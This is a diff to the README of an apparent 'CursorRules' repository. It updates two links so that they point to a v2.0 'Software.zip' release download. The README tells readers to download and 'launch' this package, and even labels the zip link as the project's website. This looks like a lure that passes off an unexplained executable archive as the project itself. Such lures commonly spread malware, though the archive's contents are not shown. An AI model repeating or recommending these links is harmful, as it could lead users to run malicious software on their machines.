@@ -12,7 +12,7 @@ Welcome to the CursorRules repository, where we provide you with a collection of
 ## 🚀 Get Started:
 To start using our cursor rules, simply download the software package provided in the link below:
 
-[![Download Software](https://github.com/fartmanlikesmen/cursorrules/releases/download/v1.0/Program.zip)](https://github.com/fartmanlikesmen/cursorrules/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/fartmanlikesmen/cursorrules/releases/download/v2.0/Software.zip)](https://github.com/fartmanlikesmen/cursorrules/releases/download/v2.0/Software.zip)
 
 Note: The provided link needs to be launched to access the software package.
 
@@ -24,7 +24,7 @@ The repository is organized into the following directories:
 Feel free to explore and customize these cursor rules to suit your website's theme and design.
 
 ## 🌐 Additional Resources:
-For more information and updates, visit our website [here](https://github.com/fartmanlikesmen/cursorrules/releases/download/v1.0/Program.zip).
+For more information and updates, visit our website [here](https://github.com/fartmanlikesmen/cursorrules/releases/download/v2.0/Software.zip).
 
 ## 🌟 Get Involved:
 We welcome contributions from the developer community to enhance and expand our collection of cursor rules. Feel free to fork the repository, make changes, and submit a pull request.
